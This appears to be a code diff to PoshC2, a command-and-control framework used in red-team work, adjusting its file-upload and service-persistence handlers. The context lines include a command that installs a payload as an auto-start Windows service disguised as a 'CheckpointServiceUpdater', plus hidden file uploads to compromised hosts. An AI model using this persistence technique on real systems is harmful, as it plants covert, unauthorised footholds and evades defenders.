@@ -1,7 +1,7 @@
 import base64, re, traceback, os
 from poshc2.client.Alias import ps_alias
 from poshc2.Colours import Colours
-from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader
+from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader, yes_no_prompt
 from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
 from poshc2.client.Help import posh_help
 from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DatabaseType, DomainFrontHeader, PayloadCommsHost
@@ -195,7 +195,7 @@ def do_install_servicelevel_persistence(user, command, randomuri):
         return
     if os.path.isfile(path):
         with open(path, "r") as p:
-            payload = p.read()        
+            payload = p.read()
     cmd = "sc.exe create CPUpdater binpath= 'cmd /c %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
     new_task(cmd, user, randomuri)
 
@@ -440,6 +440,7 @@ def do_upload_file(user, command, randomuri):
             source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
             source = PayloadsDirectory + source
         destination = session.prompt("Location to upload to: ")
+        nothidden = yes_no_prompt("Do not hide the file:")
     else:
         args = argp(command)
         source = args.source
@@ -448,7 +449,7 @@ def do_upload_file(user, command, randomuri):
     try:
         print("Uploading %s to %s" % (source, destination))
         if (nothidden):
-            uploadcommand = f"upload-file {source} {destination} -NotHidden {nothidden}"
+            uploadcommand = f"upload-file {source} {destination} -NotHidden ${nothidden}"
         else:
             uploadcommand = f"upload-file {source} {destination}"
         new_task(uploadcommand, user, randomuri)
